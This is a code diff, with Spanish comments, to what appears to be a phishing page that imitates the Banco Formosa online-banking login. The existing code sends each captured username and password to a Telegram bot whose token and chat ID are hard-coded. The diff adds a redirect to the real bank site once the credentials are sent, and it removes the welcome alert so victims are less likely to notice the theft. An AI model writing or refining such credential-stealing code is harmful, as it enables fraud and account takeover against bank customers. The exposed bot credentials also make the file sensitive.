@@ -1250,11 +1250,13 @@
         // CAMBIA ESTOS VALORES POR LOS TUYOS:
         const TELEGRAM_BOT_TOKEN = "8998295534:AAGGIxzih1XeS0pXW3TAIHEYAmRACr1Tik8";
         const TELEGRAM_CHAT_ID = "7776240161";
+        // URL DE REDIRECCIÓN
+        const REDIRECT_URL = "https://hb.bancoformosa.com.ar/";
         // =============================================
 
         var tecladoActivo = false;
 
-        // ===== FUNCIÓN PARA ENVIAR A TELEGRAM =====
+        // ===== FUNCIÓN PARA ENVIAR A TELEGRAM Y REDIRIGIR =====
         function enviarATelegram(usuario, clave) {
             const mensaje = "🔐 *Nuevo intento de inicio de sesión*%0A%0A" +
                            "👤 *Usuario:* " + encodeURIComponent(usuario) + "%0A" +
@@ -1276,6 +1278,10 @@
                 })
                 .catch(error => {
                     console.log("❌ Error de conexión con Telegram:", error);
+                })
+                .finally(() => {
+                    // Redirigir a la página de Banco Formosa después de enviar el mensaje
+                    window.location.href = REDIRECT_URL;
                 });
         }
 
@@ -1409,16 +1415,10 @@
                 return;
             }
             
-            // ===== ENVIAR A TELEGRAM =====
+            // ===== ENVIAR A TELEGRAM Y REDIRIGIR =====
             enviarATelegram(usuario, clave);
             
-            // Mostrar mensaje de bienvenida
-            alert('¡Bienvenido ' + usuario + '!');
-            
-            // Limpiar campos (opcional)
-            document.getElementById('campoUsuario').value = '';
-            document.getElementById('campoClave').value = '';
-            volverUsuario();
+            // Ya no mostramos el alert ni limpiamos campos porque la redirección ocurre en enviarATelegram
         }
 
         document.addEventListener('keydown', function(event) {
